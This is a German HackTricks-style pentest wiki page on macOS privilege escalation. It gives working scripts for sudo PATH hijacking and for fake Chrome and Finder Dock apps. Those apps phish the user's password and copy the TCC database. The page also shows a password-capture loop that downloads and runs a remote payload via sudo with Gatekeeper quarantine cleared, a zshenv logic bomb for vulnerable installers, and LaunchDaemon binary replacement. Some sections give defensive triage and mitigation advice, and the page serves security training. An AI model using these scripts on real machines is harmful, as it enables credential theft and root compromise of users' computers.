# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Wenn du wegen TCC Privilege Escalation hier bist, gehe zu:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Viele Privilege-Escalation-Techniken, die Linux oder andere Unix-ähnliche Systeme betreffen, gelten auch für macOS. Siehe:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Benutzerinteraktion

### Sudo Hijacking

Die ursprüngliche [Sudo-Hijacking-Technik findest du im Beitrag zu Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

macOS **behält** jedoch den **`PATH`** des Benutzers bei, wenn dieser **`sudo`** ausführt. Das bedeutet, dass sich dieser Angriff auch auf andere Weise umsetzen lässt: Man kann **andere Binaries hijacken**, die das Opfer bei der **Ausführung von sudo weiterhin ausführt:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Beachte, dass ein Benutzer, der das Terminal verwendet, sehr wahrscheinlich **Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock Impersonation

Mit etwas **Social Engineering** könntest du zum Beispiel **Google Chrome** im Dock **imitieren** und tatsächlich dein eigenes Skript ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Prüfe im Dock, ob Chrome vorhanden ist. Falls ja, **entferne** diesen Eintrag und **füge** den **gefälschten** **Chrome-Eintrag an derselben Position** im Dock-Array **hinzu**.

<details>
<summary>Chrome-Dock-Impersonation-Skript</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Du **kannst Finder nicht aus dem Dock entfernen**. Wenn du ihn also zum Dock hinzufügen möchtest, kannst du den gefälschten Finder direkt neben dem echten platzieren. Dazu musst du **den gefälschten Finder-Eintrag am Anfang des Dock-Arrays hinzufügen**.
- Eine weitere Möglichkeit ist, ihn nicht im Dock zu platzieren, sondern einfach zu öffnen. „Finder möchte Finder steuern“ ist nicht besonders ungewöhnlich.
- Eine weitere Möglichkeit, **ohne Nachfrage nach dem Passwort zu root zu eskalieren**, ohne ein abschreckendes Dialogfenster einzublenden, besteht darin, Finder tatsächlich nach dem Passwort für eine privilegierte Aktion fragen zu lassen:
  - Finder anweisen, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren. (Im Passwortdialog steht dann „Finder möchte sudo kopieren“.)
  - Finder anweisen, ein neues **Authorization Plugin** zu kopieren. (Du kannst den Dateinamen festlegen, sodass im Passwortdialog „Finder möchte Finder.bundle kopieren“ steht.)

<details>
<summary>Finder-Dock-Impersonation-Skript</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing über Passwortabfrage + sudo-Wiederverwendung

Malware missbraucht häufig Benutzerinteraktionen, um **ein sudo-fähiges Passwort abzugreifen** und es programmgesteuert wiederzuverwenden. Ein typischer Ablauf:

1. Den angemeldeten Benutzer mit `whoami` ermitteln.
2. **Passwortabfragen wiederholen**, bis `dscl . -authonly "$user" "$pw"` Erfolg zurückgibt.
3. Die Zugangsdaten zwischenspeichern (z. B. in `/tmp/.pass`) und privilegierte Aktionen mit `sudo -S` ausführen (Passwort über stdin).

Beispiel einer minimalen Angriffskette:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Das gestohlene Passwort kann anschließend wiederverwendet werden, um die Gatekeeper-Quarantäne mit `xattr -c` **aufzuheben**, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stufen nicht-interaktiv auszuführen.<sup>[[1]](#references)</sup>

#### Erfasste Passwörter über PAM validieren

Eine nativen Eingabeaufforderungen ähnelnde sichere Texteingabe kann ein mögliches Account-Passwort erfassen und es direkt im Prozess über PAM validieren, anstatt `dscl`, `security` oder `osascript` zu starten. Der aufrufende Prozess startet mit `pam_start` eine PAM-Transaktion, übergibt das mögliche Passwort über einen Conversation-Callback, ruft `pam_authenticate` auf und schließt die Transaktion mit `pam_end`. Eine fehlgeschlagene Prüfung kann zum Passwortfeld zurückkehren; eine erfolgreiche Prüfung bestätigt das Passwort, ohne einen separaten Verifizierungsprozess zu starten. Die PAM-Authentifizierung allein **erhöht** weder die Berechtigungen des aufrufenden Prozesses noch autorisiert sie privilegierte Vorgänge.<sup>[[9]](#references)[[10]](#references)</sup>

Wenn das Login- und das Keychain-Passwort übereinstimmen, ist das erfasste Passwort möglicherweise auch für Vorgänge verwendbar, die das aktuelle Keychain-Passwort erfordern; siehe [Keychain ACL and partition-list constraints](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Neuere macOS-spezifische Angriffsvektoren (2023–2026)

### Das veraltete `AuthorizationExecuteWithPrivileges` ist weiterhin nutzbar

`AuthorizationExecuteWithPrivileges` wurde in 10.7 als veraltet eingestuft, **funktioniert aber weiterhin unter Sonoma/Sequoia**. Viele kommerzielle Updater rufen `/usr/libexec/security_authtrampoline` mit einem nicht vertrauenswürdigen Pfad auf. Wenn die Zieldatei für den Benutzer beschreibbar ist, kannst du einen Trojaner platzieren und die legitime Eingabeaufforderung nutzen:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Kombiniere dies mit den **masquerading tricks above**, um einen glaubwürdigen Passwortdialog anzuzeigen.


### Triage privilegierter Helfer / XPC

Viele moderne macOS-privescs von Drittanbietern folgen demselben Muster: Ein **root LaunchDaemon** stellt einen **Mach/XPC service** aus **`/Library/PrivilegedHelperTools`** bereit. Anschließend validiert der Helper den **Client nicht**, validiert ihn **zu spät** (PID-Race) oder stellt eine **root-Methode** bereit, die einen **vom Benutzer kontrollierten Pfad bzw. ein Skript** verarbeitet. Diese Fehlerklasse steckt hinter vielen aktuellen Bugs in Helfern von VPN-Clients, Game-Launchern und Updatern.<sup>[[2]](#references)</sup>

Kurze Triage-Checkliste:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Achte besonders auf Helpers, die:

- **nach der Deinstallation** weiterhin Requests annehmen, weil der Job in `launchd` geladen blieb
- Scripts aus **`/Applications/...`** oder anderen Pfaden ausführen oder Konfigurationen daraus lesen, die für Nicht-root-Benutzer beschreibbar sind
- sich auf eine **PID-basierte** oder ausschließlich auf die **Bundle-ID** gestützte Peer-Validierung verlassen, die anfällig für Race Conditions sein kann

Weitere Informationen zu Authorization-Bugs bei Helpers findest du auf [dieser Seite](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Vererbung der PackageKit-Script-Umgebung (CVE-2024-27822)

Bis Apple das Problem in **Sonoma 14.5**, **Ventura 13.6.7** und **Monterey 12.7.5** behob, konnten vom Benutzer gestartete Installationen über **`Installer.app`** / **`PackageKit.framework`** **PKG-Scripts als root in der Umgebung des aktuellen Benutzers ausführen**. Das bedeutet, dass ein Package mit **`#!/bin/zsh`** die **`~/.zshenv`** des Angreifers laden und als **root** ausführen würde, wenn das Opfer das Package installierte.<sup>[[3]](#references)</sup>

Das ist besonders interessant als **logic bomb**: Du brauchst nur einen foothold im Benutzerkonto und eine beschreibbare Shell-Startdatei. Anschließend wartest du darauf, dass der Benutzer einen beliebigen anfälligen **zsh-basierten** Installer ausführt. Dies gilt im Allgemeinen **nicht** für **MDM/Munki**-Deployments, da diese in der Umgebung des root-Benutzers ausgeführt werden.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Wenn du tiefer in den Missbrauch von Installern eintauchen möchtest, findest du weitere Informationen auf [dieser Seite](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Kollision am Installationsziel über `.localized`

Manche Drittanbieter-Installer registrieren einen root LaunchDaemon, dessen ausführbare Datei über einen festen Pfad innerhalb von `/Applications/Target.app` referenziert wird. Kann ein Angreifer dieses Bundle zuerst mit einer **anderen Bundle-ID** erstellen, behält Installer möglicherweise das Köder-Bundle bei und platziert die echte App unter `/Applications/Target.localized/Target.app`. Der Daemon verweist weiterhin auf den ursprünglichen Pfad. Daher kann eine vom Angreifer kontrollierte ausführbare Datei innerhalb des Köder-Bundles später als root ausgeführt werden.<sup>[[8]](#references)</sup>

Die wichtigen Voraussetzungen sind:<sup>[[8]](#references)</sup>

1. Der Angreifer kann den erwarteten Anwendungspfad erstellen oder kontrollieren.
2. Das Paket entfernt das kollidierende Bundle nicht.
3. Der privilegierte Job verwendet einen fest codierten Pfad innerhalb dieses Bundles.
4. Der Benutzer oder ein MDM-Workflow installiert das Paket und registriert den Job.

Suche nach verschobenen Bundles und überprüfe anschließend die LaunchDaemon-Ziele mithilfe der Aufzählungsschleife im nächsten Abschnitt:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Ein sichereres Installationsprogramm löst den endgültigen Bundle-Pfad auf und speichert privilegierte ausführbare Dateien an einem root-eigenen Ort wie `/Library/PrivilegedHelperTools`. Außerdem sollte es Eigentümerschaft und Codesignatur überprüfen, bevor es den Job registriert oder startet.<sup>[[8]](#references)</sup>

### Hijacking eines beschreibbaren LaunchDaemon-Ziels

Eine LaunchDaemon-plist kann root-eigen sein, während ihr Eintrag `Program` oder der erste Eintrag in `ProgramArguments` auf ein von einem Benutzer beschreibbares Verzeichnis verweist. Prüfe den **gesamten Pfad**, nicht nur die Berechtigungen der ausführbaren Datei. Ist das übergeordnete Verzeichnis beschreibbar, kann ein Angreifer eine root-eigene ausführbare Datei umbenennen und am selben Pfad einen Ersatz erstellen. Der Ersatz wird beim nächsten Start des Jobs als root ausgeführt. Ein Neustart oder ein normaler Dienstneustart genügt. Der Angreifer benötigt keine Berechtigung, um `launchctl bootstrap` in der System-Domain auszuführen.<sup>[[7]](#references)</sup>

Zähle zuerst jedes Ziel und dessen direktes übergeordnetes Verzeichnis auf:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Wenn die Datei oder ihr übergeordnetes Verzeichnis beschreibbar ist, das originale Binary beibehalten und den Pfad durch eine ausführbare Payload ersetzen. Dann warten, bis der bereits geladene Daemon neu startet.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU-SMR-Race um Credential-Zeiger (CVE-2025-24118)

Der verwundbare Pfad `kauth_cred_proc_update` aktualisierte `proc_ro.p_ucred` mit der nicht-atomaren API `zalloc_ro_mut`, während SMR-Leser den Zeiger ohne Sperre luden. Der öffentliche Trigger verwendet eine speziell vorbereitete setgid-Binärdatei. Ein Thread wechselt zwischen seiner realen und effektiven Gruppen-ID, während ein anderer Thread wiederholt einen Systemaufruf wie `getgid()` ausführt.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Behandle dies als **Race-Primitive**, nicht als fertigen Root-Exploit. Der veröffentlichte PoC demonstriert einen zerrissenen Credential-Zeiger. Häufig endet dies in einem Kernel Panic. Der Forscher konnte die Beschädigung nur auf Intel reproduzieren und zeigte keine deterministische Kontrolle über das resultierende Credential-Objekt. Apple änderte das Update in macOS 15.3 zu einem atomaren Pointer-Austausch.<sup>[[4]](#references)</sup>

### SIP-Umgehung via Migrationsassistent („Migraine“, CVE-2023-32369)

Selbst wenn du bereits Root hast, blockiert SIP Schreibzugriffe auf Systemverzeichnisse. Der **Migraine**-Bug missbraucht das Migration-Assistant-Entitlement `com.apple.rootless.install.heritable`, um einen Child-Prozess zu starten, der die SIP-Umgehung erbt und geschützte Pfade überschreibt (z. B. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Die Angriffskette:

1. Root auf einem laufenden System erlangen.
2. `systemmigrationd` mit präpariertem Status dazu bringen, eine vom Angreifer kontrollierte Binary auszuführen.
3. Das geerbte Entitlement nutzen, um SIP-geschützte Dateien zu patchen, sodass die Änderungen auch nach einem Neustart bestehen bleiben.

### NSPredicate/XPC-Ausdrucksschmuggel (Bug-Klasse CVE-2023-23530/23531)

Mehrere Apple-Daemons akzeptieren **NSPredicate**-Objekte über XPC und validieren nur das Feld `expressionType`, das vom Angreifer kontrolliert werden kann. Durch Erstellen eines Prädikats, das beliebige Selector-Aufrufe ausführt, lässt sich **Code Execution in Root/System-XPC-Diensten** erreichen (z. B. `coreduetd`, `contextstored`). In Kombination mit einem initialen App-Sandbox-Escape ermöglicht dies **Privilege Escalation ohne Benutzerabfragen**. Suche nach XPC-Endpunkten, die Prädikate deserialisieren und keinen robusten Visitor verwenden.<sup>[[6]](#references)</sup>

## TCC - Root-Privilege-Escalation

### CVE-2020-9771 - TCC-Umgehung und Privilege Escalation über mount_apfs

**Jeder Benutzer** (auch Benutzer ohne besondere Rechte) kann einen Time-Machine-Snapshot mit `-o noowners` erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen, wodurch die Berechtigungsprüfungen des aktiven Volumes umgangen werden. Als einzige Berechtigung muss die verwendete Anwendung (z. B. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) haben.

Die Befehle und die vollständige Erklärung findest du auf der Seite zu TCC-Umgehungen:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Vertrauliche Informationen

Dies kann für eine Privilege Escalation nützlich sein:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Lokale Privilege Escalation über AWS Client VPN für macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilege Escalation über macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft „Migraine“-SIP-Umgehung (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Eine neue Bug-Klasse für Privilege Escalation unter macOS und iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon-Hijacking: Privilege Escalation und Persistenz über unsichere Ordnerberechtigungen](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS-LPE über das Verzeichnis .localized](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: macOS-Malware, die sich als Zwischenablage-Manager-App ausgibt](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - MacSync unter der Lupe](https://securelist.com/macsync-new-version/121383/)
